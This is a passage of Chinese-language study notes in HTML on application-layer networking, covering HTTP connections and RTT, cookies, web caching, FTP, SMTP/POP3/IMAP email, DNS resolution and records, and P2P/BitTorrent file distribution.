，端口号为80。</li></ul><blockquote><p>   服务器在最初建立之时会有一个socket（waiting socket）守候在80端口。如果一个浏览器（客户端）向服务器建立连接，此时又会有一个socket（connection socket）产生（代表该服务器与客户端的会话关系）。</p><p>   waiting socket比较特殊，作用就是等待其他浏览器（客户端）并发访问该服务器，而connection socket则表示会话关系，可以有多个。</p></blockquote><p>   服务器接受客户的TCP连接</p><p>   在浏览器(HTTP客户端)与 Web服务器(HTTP服务器server)交换HTTP报文(应用层协议报文)</p><p>   TCP连接关闭</p></li><li><p>HTTP是无状态的：服务器并不维护关于客户的任何信息（无状态的好处就是简单，不需要维护一些内容）</p><blockquote><p>无状态：客户端向服务器发送请求，服务器接收请求，并返回响应报文，断开连接，结束。（不知道该客户端之前有没有访问过，未来还会不会接着访问）</p></blockquote></li><li><p>非持久HTTP（Nonpersistent HTTP）连接</p><ul><li><p>最多只有一个对象在TCP连接上发送</p></li><li><p>下载多个对象需要多个TCP连接</p></li><li><p>HTTP&#x2F;1.0使用非持久连接</p></li></ul></li><li><p>持久HTTP（Persistent HTTP）连接</p><p>   多个对象可以在一个（在客户端和服务器之间的）TCP连接上传输</p><p>   HTTP&#x2F;1.1 默认使用持久连接</p></li></ul><h3 id="响应时间模型："><a href="#响应时间模型：" class="headerlink" title="响应时间模型："></a>响应时间模型：</h3><ul><li><p>RTT（往返时间，round-trip time）：一个小的分组从客户端到服务器，再回到客户端的时间（传输时间忽略）</p></li><li><p>响应时间：</p><ul><li>一个RTT用来发起TCP连接</li><li>一个 RTT用来HTTP请求并等待HTTP响应</li><li>文件传输时间</li></ul><blockquote><p>在非持久HTTP连接下请求一个文件（对象）的时间 &#x3D; 2RTT + 传输时间</p></blockquote></li></ul><p>非持久HTTP的缺点：</p><ul><li><p>请求每个对象需要2个 RTT</p></li><li><p>操作系统必须为每个TCP连接分配资源</p></li><li><p>浏览器通常打开并行TCP连接 ，以获取引用对象</p><blockquote><p>并行连接，即同时开启多个连接请求不同对象。</p><p>   1index.html + 10jpeg &#x3D; 2RTT（建立连接） + 2RTT（并行请求对象） &#x3D; 4RTT</p></blockquote></li></ul><p>持久HTTP（Persistent HTTP）连接：</p><ul><li><p>服务器在发送响应后，仍保持TCP连接</p></li><li><p>在相同客户端和服务器之间的后续请求和响应报文通过相同的连接进行传送</p></li><li><p>客户端在遇到一个引用对象的时候，就可以尽快发送该对象的请求</p></li><li><p>非流水方式的持久HTTP（Persistent without pipelining）：</p><ul><li><p>客户端只能在收到前一个响应后才能发出新的请求</p></li><li><p>每个引用对象需要一个RTT</p></li></ul><blockquote><p>   1index.html + 10jpeg &#x3D; 2RTT（建立连接） + 10×1RTT（10jpeg） &#x3D; 12RTT</p></blockquote></li><li><p>流水方式的持久HTTP（Persistent with pipelining）：</p><ul><li><p>HTTP&#x2F;1.1的默认模式</p></li><li><p>客户端遇到一个引用对象就立即产生一个请求</p></li><li><p>所有引用（小）对象基本上只用一个RTT时间就能满足</p><blockquote><p>1index.html + 10jpeg &#x3D; 2RTT（建立连接） + 1RTT（10jpeg） &#x3D; 3RTT</p></blockquote></li></ul></li></ul><h3 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h3><p>有两种类型的HTTP报文：<strong>request</strong>（请求报文）、<strong>response</strong>（响应报文）。</p><ul><li><p>HTTP请求报文：</p><p>   请求报文的通用格式如下图：</p><blockquote><p>   提交表单有两种方式：</p><ul><li>Post方式：<ul><li>网页通常包括表单输入</li><li>输入的数据放在实体(entity body )部分上传到服务器</li></ul></li><li>URL方式：<ul><li>方法：GET方法</li><li>输入的数据放在URL中上传</li></ul></li></ul></blockquote><blockquote><p>  方法类型：<br>   HTTP&#x2F;1.0<br>       GET<br>           POST<br>           HEAD（要求服务器在响应报文中不包含请求对象→维护或者建立索引时引用）<br>       HTTP&#x2F;1.1<br>           GET, POST, HEAD<br>           PUT（将实体中的文件上载到URL字段规定的路径→通常做网页内容的维护）<br>           DELETE（删除URL字段规定的文件）</p></blockquote></li><li><p>HTTP响应报文：</p><blockquote><p>HTTP响应状态码：</p><ul><li>200 OK：请求成功，请求对象包含在响应报文的后续部分。</li><li>301 Moved Permanently：请求的对象已经被永久转移了；新的URL在响应报文的Location: 首部行中指定。客户端软件自动用新的URL去获取对象。</li><li>400 Bad Request：一个通用的差错代码，表示该请求不能被服务器解读。</li><li>404 Not Found：请求的文档在该服务上没有找到。</li><li>505 HTTP Version Not Supported</li></ul></blockquote></li></ul><h2 id="用户-服务器状态：cookies"><a href="#用户-服务器状态：cookies" class="headerlink" title="用户-服务器状态：cookies"></a>用户-服务器状态：cookies</h2><blockquote><p>   大多数主要的门户网站使用 cookies</p></blockquote><p>cookies有4个组成部分：</p><ul><li><p>在HTTP响应报文中有一个cookie的首部行</p></li><li><p>在HTTP请求报文含有一个cookie的首部行</p></li><li><p>在用户端系统中保留有一个cookie文件，由用户的浏览器管理</p></li><li><p>在Web站点有一个后端数据库</p><blockquote><p>   客户端（浏览器）在第一次向服务器发送请求时不携带cookie，服务器也会判断，这是第一次访问，并会在响应报文中设置一个cookie，客户端收到响应报文后会将服务器发送来的cookie存到本地，下一次再访问该服务器时就会携带上该cookie值，此时服务器就可以凭借cookie值去判断、分析客户端的状态。</p><p>通过cookie，可以将HTTP从一个无状态的协议转换为一个有状态的协议。</p></blockquote></li></ul><p>cookies可以带来以下内容：</p><ul><li>authorization 授权（用户验证）</li><li>shopping carts 购物车</li><li>recommendations 推荐</li><li>user session state (Web e-mail) 用户会话状态</li></ul><blockquote><p>   如何维护状态：</p><pre><code>协议端节点：在多个事务上 ，发送端和接收端维持状态（不会保留在中间节点中）   http报文携带状态信息</code></pre></blockquote><p>cookies的副作用：</p><ul><li>Cookies允许站点知道许多关于用户的信息（隐私）</li><li>网站记录用户信息并分析用户行为（可能将它知道的东西卖给第三方）</li><li>使用重定向和cookie的搜索引擎还能知道用户更多的信息（姓名、电话、邮箱等）</li></ul><h2 id="Web-caches（proxy-server）缓存（代理服务器）"><a href="#Web-caches（proxy-server）缓存（代理服务器）" class="headerlink" title="Web caches（proxy server）缓存（代理服务器）"></a>Web caches（proxy server）缓存（代理服务器）</h2><p>目标：不访问原始服务器，就可以满足客户的请求。</p><p>缓存既是客户端又是服务器。</p><p>通常缓存是由ISP安装 (大学、公司、居民区ISP)</p><blockquote><p>   浏览器将所有的HTTP请求发给缓存（代理服务器）</p><ul><li>在缓存中的对象：缓存直接返回对象</li><li>如对象不在缓存，缓存请求原始服务器，然后再将对象返回给客户端</li></ul><p>   优势：</p><ul><li>降低客户端的请求响应时间</li><li>可以大大减少一个机构内部网络与Internent接入链路上的流量</li><li>互联网大量采用了缓存： 可以使较弱的ICP也能够有效提供内容（快速分发内容）</li></ul></blockquote><p>条件GET方法</p><blockquote><p>   使用缓存有一个风险：客户端访问到的缓存中的数据，在原始服务器中已修改，结果就是拿到旧数据。</p><p>   为此HTTP协议做了一个升级：Conditional GET（条件GET）</p></blockquote><p>目标：如果缓存器中的对象拷贝是最新的，就不要发送对象</p><blockquote><ul><li>缓存器: 在HTTP请求中指定缓存拷贝的日期</li></ul><pre><code>   If-modified-since:&lt;date’&gt;</code></pre><ul><li><p>服务器:</p><pre><code>  - 如果缓存拷贝没有改变，则响应报文不包含对象: HTTP/1.0 304 Not Modified  - 如果缓存拷贝改变，则返回数据：HTTP/1.0 200 OK &lt;data’&gt;</code></pre></li></ul></blockquote><h2 id="Short-URL"><a href="#Short-URL" class="headerlink" title="Short URL"></a>Short URL</h2><p>把普通网址，转换成比较短的网址。（比如：<a href="http://t.cn/RlB2PdD%EF%BC%89">http://t.cn/RlB2PdD）</a></p><ul><li>微博；这些限制字数的应用里都用到这种技术。</li><li>百度短网址：<a href="http://dwz.cn/">http://dwz.cn/</a></li><li>google短网址： <a href="https://goo.gl/">https://goo.gl/</a></li></ul><p>当我们在浏览器里输入 <a href="http://t.cn/RlB2PdD">http://t.cn/RlB2PdD</a> 时会经历以下步骤：</p><ol><li><p>浏览器解析DNS，获取域名对应的IP；</p></li><li><p>当获取到IP时，会往这个IP地址发送http的get请求以获取到RlB2PdD对应的长链接地址；</p></li><li><p>HTTP通过301转到对应的长链接URL；</p></li></ol><blockquote><pre><code>   注意：这里为什么使用301？   301是永久性转移（重定向）。也就是说，这个短地址一经生成就不会发生变化了。</code></pre></blockquote><h2 id="FTP（文件传输协议）"><a href="#FTP（文件传输协议）" class="headerlink" title="FTP（文件传输协议）"></a>FTP（文件传输协议）</h2><ul><li><p>向远程主机上传输文件或从远程主机接收文件</p></li><li><p>建立在TCP基础之上</p></li><li><p>客户&#x2F;服务器模式：<br>   客户端：发起传输的一方<br>   服务器：远程主机</p></li><li><p>ftp: RFC 959</p></li><li><p>ftp服务器：端口号为21</p></li></ul><blockquote><pre><code>   FTP客户端与FTP服务器通过端口21联系，并使用TCP为传输协议   客户端通过控制连接获得身份确认（通过TCP）（用户名和口令，全部都为明文）   客户端通过控制连接发送命令浏览远程目录（可以上传、下载）   收到一个文件传输命令时，服务器打开一个到客户端的TCP数据传输连接（客户端的20号端口，由服务器主动建立），控制信息/指令和数据传输的连接是不一样的。   一个文件传输完成后，服务器关闭连接   服务器打开第二个TCP数据连接用来传输另一个文件   控制连接： 带外（ “out of band” ）传送（只能建立一个）   数据连接：带内传送（可以建立多个）   FTP服务器维护用户的状态信息： 当前路径、用户帐户与控制连接对应（FTP是一个有状态的协议）</code></pre></blockquote><p>FTP在控制连接上以ASCII文本方式传送：</p><blockquote><p>   命令样例：</p><pre><code>   USER username   PASS password   LIST：请服务器返回远程主机当前目录的文件列表   RETR filename（重复性下载文件）：从远程主机的当前目录检索文件 (gets)   STOR filename（上载文件）：向远程主机的当前目录存放文件 (puts)</code></pre><p>   返回码样例：（状态码和状态信息 (同HTTP)）</p><pre><code>   331 Username OK, password required   125 data connection already open; transfer starting   425 Can’t open data connection   452 Error writing file</code></pre></blockquote><h2 id="Electronic-mail（Email）"><a href="#Electronic-mail（Email）" class="headerlink" title="Electronic mail（Email）"></a>Electronic mail（Email）</h2><p>电子邮件（Email）的三个主要组成部分</p><ul><li><p>user agents （用户代理）</p><pre><code>   又名 “邮件阅读器”   撰写、编辑和阅读邮件   如Outlook、Foxmail   输出和输入邮件保存在服务器上</code></pre></li><li><pre><code>mail servers（邮件服务器）</code></pre></li></ul><blockquote><pre><code>       邮箱中管理和维护发送给用户的邮件       输出报文队列保持待发送邮件报文       邮件服务器之间的SMTP协议：发送email报文           客户：发送方邮件服务器           服务器：接收端邮件服务器   两个作用：       用户代理配置好邮件服务器的IP地址、端口号，然后用户代理把邮件发送给邮件服务器的队列当中。邮件服务器会把队列中的邮件依次发送到目标邮件服务器中。       （用户代理发邮件到邮件服务器用的是SMTP协议）       然后目标邮件服务器接收到邮件后会把邮件放到相应用户的目录（邮箱）当中。收件人运行客户代理，从邮件服务器中相应的自己的邮箱中把信件拉回到本地。       （邮件服务器发给目标邮件服务器使用的是SMTP协议）       （“拉”邮件的协议有三种：POP3、IMAP、HTTP）</code></pre></blockquote><h2 id="simple-mail-transfer-protocol-SMTP（简单邮件传输协议）"><a href="#simple-mail-transfer-protocol-SMTP（简单邮件传输协议）" class="headerlink" title="simple mail transfer protocol: SMTP（简单邮件传输协议）"></a>simple mail transfer protocol: SMTP（简单邮件传输协议）</h2><blockquote><pre><code>   使用TCP在客户端和服务器之间传送报文，端口号为25   直接传输：从发送方服务器到接收方服务器   传输的3个阶段：       握手       传输报文       关闭   命令/响应交互：       命令：ASCII文本       响应：状态码和状态信息   报文必须为7位ASCII码（邮件的内容必须是7位ASCII码的范围，超过是不允许传输的）</code></pre></blockquote><p>邮件发送举例如下图：</p><p>说明：</p><ol><li><p>Alice使用用户代理撰写邮件并发送给<a href="mailto:&#x62;&#111;&#98;&#x40;&#115;&#x6f;&#109;&#101;&#115;&#x63;&#x68;&#x6f;&#x6f;&#108;&#x2e;&#101;&#100;&#117;">&#x62;&#111;&#98;&#x40;&#115;&#x6f;&#109;&#101;&#115;&#x63;&#x68;&#x6f;&#x6f;&#108;&#x2e;&#101;&#100;&#117;</a></p></li><li><p>Alice的用户代理将邮件发送到她的邮件服务器；邮件放在报文队列中（SMTP）</p></li><li><p>SMTP的客户端打开到Bob邮件服务器的TCP连接</p></li><li><p>SMTP客户端通过TCP连接发送Alice的邮件（SMTP）</p></li><li><p>Bob的邮件服务器将邮件放到Bob的邮箱</p></li><li><p>Bob调用他的用户代理阅读邮件（POP3、IMAP、HTTP）</p></li></ol><blockquote><ul><li>邮件服务器会周期性扫描队列，隔一段时间将收集的邮件全部发出。（如果每时每刻都处于“待命”状态是很耗能的）</li><li>可能导致邮件发送失败的原因：<ul><li>网络连接有问题</li><li>接收方的邮件服务器地址填写错误</li><li>垃圾邮件过滤</li></ul></li><li>如果邮件发送失败，会将该邮件发送给另外一个失败的队列中，隔一段时间后重新发送，若仍失败，则退回该邮件。</li></ul></blockquote><h3 id="SMTP-vs-HTTP"><a href="#SMTP-vs-HTTP" class="headerlink" title="SMTP vs HTTP"></a>SMTP vs HTTP</h3><p><strong>SMTP</strong></p><ul><li><pre><code>   SMTP：推（push）</code></pre></li><li><pre><code>   SMTP使用持久连接</code></pre></li><li><pre><code>   SMTP要求报文（首部和主体）为7位ASCII编码</code></pre></li><li><pre><code>   SMTP服务器使用 CRLF.CRLF决定报文的尾部</code></pre></li><li><pre><code>   SMTP：多个对象包含在一个报文中</code></pre></li></ul><p><strong>HTTP</strong></p><ul><li><pre><code>   HTTP：拉（pull）</code></pre></li><li><pre><code>   二者都是ASCII形式的命令/响应交互、状态码</code></pre></li><li><pre><code>   HTTP：每个对象封装在各自的响应报文中</code></pre></li></ul><h3 id="邮件报文格式"><a href="#邮件报文格式" class="headerlink" title="邮件报文格式"></a>邮件报文格式</h3><ul><li><p>SMTP：交换email报文的协议</p></li><li><p>RFC 822: 文本报文的标准：</p><ul><li><p>首部行：如</p><pre><code>To:From:Subject:与SMTP命令不同 ！</code></pre></li></ul></li><li><p>主体：</p><ul><li>报文，只能是ASCII码字符</li></ul></li><li><p>问题：如果传输的内容包含中文字符，都不在ASCII范围之内。就要对其进行编码（扩展）：</p></li><li><p>MIME：多媒体邮件扩展（multimedia mail extension）,RFC 2045, 2056</p></li><li><p>在报文首部用额外的行申明MIME内容类型</p></li><li><p>内部的编码采用base64编码格式</p><blockquote><p>使用bsae64，将不在ASCII范围之内的内容进行长扩展，使得其在ASCII范围之内。（大小写英文字母，加号，等号）</p></blockquote></li></ul><h3 id="邮件访问协议"><a href="#邮件访问协议" class="headerlink" title="邮件访问协议"></a>邮件访问协议</h3><ul><li>SMTP: 传送到接收方的邮件服务器</li><li>邮件访问协议：从服务器访问邮件（“拉”）<ul><li>POP：邮局访问协议（Post Office Protocol）[RFC 1939]<ul><li>用户身份确认 (代理&lt;–&gt;服务器) 并下载</li></ul></li><li>IMAP：Internet邮件访问协议（Internet Mail Access Protocol）[RFC 1730]<ul><li>相比POP3更多特性 (更复杂，如：远程目录维护；仅仅只下载邮件正文，附件可选择下载，对手机端友好)</li><li>直接在邮件服务器上处理存储的报文</li></ul></li><li>HTTP：Hotmail , Yahoo! Mail等<br>  方便</li></ul></li></ul><p>POP3协议</p><ul><li><pre><code>   有邮件“download and delete”（下载并删除）模式</code></pre></li><li><pre><code>   有邮件“Download-and-keep”（下载并保留）模式（不同的客户机都可以拷贝邮件）</code></pre></li></ul><ul><li><pre><code>   POP3在会话中是无状态的（不支持远程目录维护）</code></pre></li></ul><p>IMAP协议</p><ul><li>IMAP服务器将每个报文与一个文件夹联系起来</li><li>允许用户用目录来组织报文</li><li>允许用户读取报文组件</li><li>IMAP在会话过程中保留用户状态：目录名、报文ID与目录名之间映射</li></ul><h2 id="DNS-Domain-Name-System"><a href="#DNS-Domain-Name-System" class="headerlink" title="DNS(Domain Name System)"></a>DNS(Domain Name System)</h2><p>域名解析系统是一个给其他“应用”应用的应用。（提供域名到IP地址的转换）</p><p>DNS的必要性：</p><p>先明白IP地址的作用：一个是标识，一个是寻址。网络设备都是按照IP地址来工作的，但是这有一个问题，IP地址都是数字（IPv4：4Byte，32bit；IPv6：16Byte，128bit），人很难记忆。人类还是更倾向于使用有意义的字符串来标识Internet上的设备。所以域名解析系统就应运而生：它提供域名到IP地址的转换。</p><p>接下来我们要考虑的是DNS如何实现这一功能，即我们需要考虑以下问题：</p><ul><li><p>问题一：如何命名设备？</p><pre><code>   用有意义的字符串：好记，便于人类用使用   解决一个平面命名的重名问题：层次化命名</code></pre></li><li><p>问题二：如何完成名字到IP地址的转换？</p><p>   分布式的数据库维护和响应名字查询（仅由单一设备去维护上亿数量的用户设备的域名解析是不可能的）</p></li><li><p>问题三：如何维护：增加或者删除一个域，需要在域名系统中做哪些工作？</p></li></ul><h3 id="DNS总体思路和目标"><a href="#DNS总体思路和目标" class="headerlink" title="DNS总体思路和目标"></a>DNS总体思路和目标</h3><ul><li><p>主要思路：</p><ul><li>分层的、基于域的命名机制</li><li>若干分布式的数据库完成名字到IP地址的转换</li><li>运行在UDP之上端口号为53的应用服务</li><li>核心的Internet功能，但在端系统（边缘）中的应用层实现</li></ul></li><li><p>主要目标：</p><ul><li><p>实现主机名-IP地址的转换(name&#x2F;IP translate)</p></li><li><p>其他目的：</p><ul><li><p>主机别名-规范名字的转换：Host aliasing</p><blockquote><p>规范名字便于管理，主机别名便于访问</p></blockquote></li><li><p>邮件服务器别名-邮件服务器的正规名字的转换：Mail server aliasing</p></li><li><p>负载均衡：Load Distribution</p></li></ul></li></ul></li></ul><h3 id="DNS名字空间"><a href="#DNS名字空间" class="headerlink" title="DNS名字空间"></a>DNS名字空间</h3><p>DNS域名结构</p><p>一个层面命名设备会有很多重名，因而DNS采用层次树状结构的命名方法：</p><ul><li><p>Internet根被划为几百个顶级域(top lever domains，TLD)</p><ul><li><p>通用的(generic)：</p><pre><code>   .com; .edu ; .gov ; .int ; .mil ; .net ; .org; .firm ; .hsop ; .web ; .arts ; .rec ;</code></pre></li><li><p>国家的(countries)：</p><pre><code>   .cn ; .us ; .nl ; .jp</code></pre></li></ul></li><li><p>每个(子)域下面可划分为若干子域(subdomains)</p></li><li><p>树叶是主机</p></li></ul><p>全世界一共有13个根域名服务器（中国没有）</p><p>域名（Domain Name）</p><ul><li>从本域往上，直到树根（根域名）。中间使用“.”间隔不同的级别<ul><li>域的域名：可以用于表示一个域</li><li>主机的域名：一个域上的一个主机</li></ul></li></ul><p>域名的管理</p><ul><li>一个域管理其下的子域（例如：.cn 被划分为 edu.cn ；com.cn ）</li><li>创建一个新的域，必须征得它所属域的同意</li></ul><p>域与物理网络无关</p><ul><li><p>域遵从组织界限，而不是物理网络</p></li><li><pre><code>   一个域的主机可以不在一个网络</code></pre></li><li><pre><code>   一个网络的主机不一定在一个域</code></pre><blockquote><p>例如：我在中国的某间教室运行一台主机，而这台主机域名由欧洲的某个服务器维护。</p></blockquote></li><li><p>域的划分是逻辑的，而不是物理的</p></li></ul><p>域名-IP地址的转换</p><blockquote><p>   前面提到单一域名服务器存在的问题：</p><ul><li>可靠性问题：单点故障</li><li>扩展性问题：通信容量</li><li>维护问题：远距离的集中式数据库</li></ul></blockquote><p>区域(zone)：</p><ul><li><p>区域的划分有区域管理者自己决定</p></li><li><p>将DNS名字空间划分为互不相交的区域，每个区域都是树的一部分</p></li><li><p>名字服务器：</p><ul><li>每个区域都有一个权威名字服务器：维护着它所管辖区域的权威信息 (authoritative record)</li><li>名字服务器允许被放置在区域之外，以保障可靠性</li></ul></li></ul><p><strong>TLD服务器（顶级域服务器）</strong></p><p>负责顶级域名（如com, org, net, edu和gov）和所有国家级的顶级域名（如cn, uk, fr, ca, jp）</p><ul><li>Network solutions 公司维护com TLD服务器</li><li>Educause公司维护edu TLD服务器</li></ul><p>区域名字服务器维护资源记录</p><ul><li><p>资源记录(resource records)<br>   作用：维护域名-IP地址(其它)的映射关系<br>   位置：Name Server的分布式数据库中</p></li><li><p>RR格式: (domain_name, ttl, type,class,Value)</p><ul><li><p>Domain_name: 域名</p></li><li><p>TTL: time to live : 生存时间(权威，缓冲记录)</p><blockquote><p>决定了资源记录应当从缓存中删除的时间</p></blockquote></li><li><p>Class 类别 ：对于Internet，值为IN</p></li><li><p>Value 值：可以是数字，域名或ASCII串</p></li><li><p>Type 类别：资源记录的类型</p><ol><li>Type&#x3D;A：<br>  Name为主机<br>  Value为IP地址</li><li>Type&#x3D;CNAME：<br>  Name为规范名字的别名（如：<a href="http://www.ibm.com/">www.ibm.com</a> 的规范名字为servereast.backup2.ibm.com）<br>  value 为规范名字</li><li>Type&#x3D;NS：<br>  Name域名(如foo.com)<br>  Value为该域名的权威服务器的域名</li><li>Type&#x3D;MX：<br>  Value为name对应的邮件服务器的名字</li></ol></li></ul></li></ul><p>DNS工作过程</p><ul><li><p>应用调用解析器(resolver)</p></li><li><p>解析器作为客户向Local Name Server发出查询报文（封装在UDP段中）</p><p>   解析器如何知道Local Name Server的IP地址：这是提前配置好的</p><p>   一台设备上网，必须要具备四个信息：</p><ol><li>主机的IP地址</li><li>所在的子网的子网掩码</li><li>Local Name Server</li><li>Default Gateway（默认网关）：从当前子网将数据传出其他子网</li></ol></li><li><p>Name Server返回响应报文(name&#x2F;ip)</p></li></ul><p>本地域名服务器（Local Name Server）</p><ul><li><p>并不严格属于层次结构</p></li><li><p>每个ISP （居民区的ISP、公司、大学）都有一 个本地DNS服务器（也称为“默认名字服务器”）</p></li><li><p>当一个主机发起一个DNS查询时，查询被送到其本地DNS服务器</p><blockquote><p>起着代理的作用，将查询转发到层次结构中</p></blockquote></li></ul><p>名字解析过程</p><pre><code>目标名字在Local Name Server中    情况1：查询的名字在该区域内部    情况2：缓存(cashing)</code></pre><p>如果Local Name Server的缓存没有信息</p><ul><li>递归查询</li></ul><pre><code>问题：名字解析负担都放在当前联络的名字服务器上，根服务器的负担太重为此出现了迭代查询</code></pre><ul><li>迭代查询</li></ul><blockquote><pre><code>   主机cis.poly.edu 想知道 主机 gaia.cs.umass.edu 的IP地址</code></pre><ul><li><pre><code> 根（及各级域名）服务器返回的不是查询结果，而是下一个NS的地址</code></pre></li><li><pre><code>   最后由权威名字服务器给出解析结果</code></pre></li><li><pre><code>   当前联络的服务器给出可以联系的服务器的名字</code></pre></li><li><pre><code>   “我不知道这个名字，但可以向这个服务器请求”</code></pre></li></ul></blockquote><h3 id="DNS协议、报文"><a href="#DNS协议、报文" class="headerlink" title="DNS协议、报文"></a>DNS协议、报文</h3><p>如下图所示：<br><img src="https://www.helloimg.com/images/2023/03/27/o3ZohX.png" alt="DNS协议、报文"></p><p>提高性能：缓存</p><ul><li><p>一旦名字服务器学到了一个映射，就将该映射缓存起来</p></li><li><p>根服务器通常都在本地服务器中缓存着（使得根服务器不用经常被访问）</p></li><li><p>目的：提高效率</p></li><li><p>可能存在的问题：如果情况变化，缓存结果和权威资源记录不一致</p><blockquote><p>   解决方案：TTL（默认2天）</p></blockquote></li></ul><h3 id="新增域"><a href="#新增域" class="headerlink" title="新增域"></a>新增域</h3><ul><li><p>在上级域的名字服务器中增加两条记录，指向这个新增的子域的域名和域名服务器的地址</p></li><li><p>在新增子域的名字服务器上运行名字服务器，负责本域的名字解析： 名字→IP地址</p><blockquote><p>如：在com域中建立一个“Network Utopia”</p></blockquote></li><li><p>到注册登记机构注册域名networkutopia.com</p><ul><li><p>需要向该机构提供权威DNS服务器（基本的、和辅助的）的名字和IP地址</p></li><li><p>登记机构在com TLD服务器中插入两条RR记录:</p><p>   (networkutopia.com, dns1.networkutopia.com, NS)</p><p>   (dns1.networkutopia.com, 212.212.212.1, A)</p></li></ul></li><li><p>在networkutopia.com的权威服务器中确保有：<br>   用于Web服务器的<a href="http://www.networkuptopia.com的类型为a的记录/">www.networkuptopia.com的类型为A的记录</a><br>   用于邮件服务器mail.networkutopia.com的类型为MX的记录</p></li></ul><h2 id="P2P应用"><a href="#P2P应用" class="headerlink" title="P2P应用"></a>P2P应用</h2><p>前面介绍过，任何节点即是服务器，又是客户端。</p><ul><li>没有（或极少）一直运行的服务器</li><li>任意端系统都可以直接通信</li><li>利用peer的服务能力</li><li>Peer节点间歇上网，每次IP地址都有可能变化</li><li>例子：<ul><li>文件分发 (BitTorrent)</li><li>流媒体(KanKan)</li><li>VoIP (Skype)</li></ul></li></ul><h3 id="P2P文件传输"><a href="#P2P文件传输" class="headerlink" title="P2P文件传输"></a>P2P文件传输</h3><p>这一部分我们将C&#x2F;S模式和P2P模式的文件分发对比来看：</p><ul><li><p>文件分发时间：C&#x2F;S模式</p></li><li><p>服务器传输： 都是由服务器发送给peer，服务器必须顺序传输（上载）N个文件拷贝:</p><ul><li>发送一个copy: F&#x2F;us</li><li>发送N个copy： NF&#x2F;us</li></ul></li><li><p>客户端: 每个客户端必须下载一个文件拷贝</p><ul><li>dmin &#x3D; 客户端最小的下载速率</li><li>下载带宽最小的客户端下载的时间：F&#x2F;dmin</li></ul></li></ul><blockquote><p>采用C&#x2F;S方法将一个F大小的文件分发给N个客户端耗时：<br>$$D_{C&#x2F;S} \ge \max(NF&#x2F;u_s,F&#x2F;d_{min})$$</p><ul><li>当客户端数量很少时，影响传输时间的瓶颈是客户端的下载速率；</li><li>当客户端数量很多时，影响传输时间的瓶颈是服务器端的上载速率。</li></ul></blockquote><ul><li>文件分发时间：P2P模式</li></ul><ul><li><p>服务器传输：最少需要上载一份拷贝</p><ul><li>发送一个拷贝的时间：F&#x2F;us</li></ul></li><li><p>客户端: 每个客户端必须下载一个拷贝</p><ul><li>最小下载带宽客户单耗时：: F&#x2F;dmin</li></ul></li><li><p>客户端: 所有客户端总体下载量NF</p><ul><li>最大上载带宽是：</li></ul></li></ul><p>$$u_s + \sum_{} u_i<br>$$</p><ul><li>除了服务器可以上载，其他所有的peer节点都可以上载</li></ul><blockquote><p>采用P2P方法 将一个F大小的文件分发给N个客户端耗时:<br>$$D_{P2P} \ge \max(F&#x2F;u_s, F&#x2F;d_{min}, NF&#x2F;(u_s + \sum{}u_i))<br>$$<br>随着客户端的数量增多，P2P模式的优势就体现出来了：客户端数量越多，较C&#x2F;S模式节约的时间就越多。</p></blockquote><p>下图比较直观的给出二者的对比：<br><img src="https://www.helloimg.com/images/2023/03/27/o3ZvaQ.png" alt="p2p"></p><blockquote><p>P2P文件共享的例子：</p><p>Alice在其笔记本电脑上运行P2P客户端程序<br>间歇性地连接到Internet，每次从其ISP得到新的IP地址<br>请求“双截棍.MP3”<br>应用程序显示其他有“ 双截棍.MP3” 拷贝的对等方<br>Alice选择其中一个对等方， 如Bob.<br>文件从Bob’s PC传送到Alice的笔记本上：HTTP<br>当Alice下载时，其他用户也可以从Alice处下载<br>Alice的对等方既是一个Web客户端，也是一个瞬时Web服务器</p></blockquote><p>从以上例子我们会思考，P2P文件共享需要解决以下问题：</p><ol><li>如何定位所需资源</li><li>如何处理对等方的加入与离开</li></ol><p>可能的方案：</p><ol><li>集中式目录</li><li>完全分布式</li><li>混合体</li></ol><h3 id="P2P：集中式目录"><a href="#P2P：集中式目录" class="headerlink" title="P2P：集中式目录"></a>P2P：集中式目录</h3><p>最初的“Napster”设计：</p><ul><li><p>当对等方连接时，它告知中心服务器：</p><ul><li>IP地址</li><li>内容</li></ul></li><li><p>Alice查询 “双截棍 .MP3”</p></li><li><p>Alice从Bob处请求文件</p></li></ul><blockquote><p>集中式目录存在的问题：</p><ul><li>单点故障</li><li>性能瓶颈</li><li>侵犯版权</li></ul></blockquote><h3 id="P2P：查询洪泛（Gnutella）"><a href="#P2P：查询洪泛（Gnutella）" class="headerlink" title="P2P：查询洪泛（Gnutella）"></a>P2P：查询洪泛（Gnutella）</h3><p>全分布式（没有中心服务器）<br>开放文件共享协议<br>许多Gnutella客户端实现了Gnutella协议（类似HTTP有许多的浏览器）<br>覆盖网络：图</p><p>如果X和Y之间有一个TCP连接，则二者之间存在一条边<br>所有活动的对等方和边就是覆盖网络<br>边并不是物理链路<br>给定一个对等方，通常所连接的节点少于10个</p><h2 id="比特洪流（BitTorrent）"><a href="#比特洪流（BitTorrent）" class="headerlink" title="比特洪流（BitTorrent）"></a>比特洪流（BitTorrent）</h2><blockquote><p>   Peer如果想参与到文件传输需要加入到“洪流”（指一些Peer节点的列表和它们之间服务与被服务的关系）当中。</p><p>   以学习小组为例会比较形象的描述文件传输的过程：假设一门课程的内容被分为很多小的知识点，这些知识点被分发在学习小组当中，那么节点与节点之间可以相互通信，共享这些知识点，从而使每个节点都学习到所有的知识点，掌握整门课程内容。</p><p>   课程内容就是一个大型文件，知识点就是被划分为的一个个块（256KB）。</p><p>   那么我们开始思考，各个节点如何知晓其他节点需要哪些块呢？</p><p>   这里就会提出一个概念：bit map。</p><p>   我们可以用很小的位去标识整个文件中所有块的有无情况：1表示有；0表示无。这样构成一个一一映射的关系。</p><p>   洪流中的节点会定期互相交换自己的bit map，从而就知晓了其他节点拥有块的情况。</p><p>  一开始新加入的节点没有任何块，它会随机的访问其他节点获取块，当获取到四个块之后，就会改变获取策略：优先请求稀缺的块。</p><p>   简单分析一下这种思想：节点优先获取稀缺的块，从而其他节点就会不断访问该节点，该节点从其他节点不断地获取更好的服务，同时也可以向其他节点提供更好的服务。</p></blockquote><ul><li><p>文件被分为一个个块256KB</p></li><li><p>网络中的这些peers发送接收文件块，相互服务</p></li><li><p>tracker:跟踪torrent中参与节点</p></li><li><p>Torrent（洪流）: 节点的组，之间交换文件块</p><blockquote><p>例：Alice加入到网络中，首先需要从从跟踪服务器处获得peer节点列表， 